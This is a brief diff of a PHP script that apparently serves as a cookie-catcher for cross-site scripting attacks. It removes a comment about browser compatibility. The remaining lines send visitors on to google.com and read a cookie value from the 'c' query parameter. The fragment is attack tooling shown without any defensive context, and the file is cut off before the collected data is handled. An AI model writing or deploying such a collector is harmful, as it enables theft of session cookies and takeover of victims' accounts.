@@ -1,5 +1,3 @@
-// Works for Safari, not for Chrome
-
 <?php
 header ('Location:https://google.com');
 	$cookies = $_GET['c'];
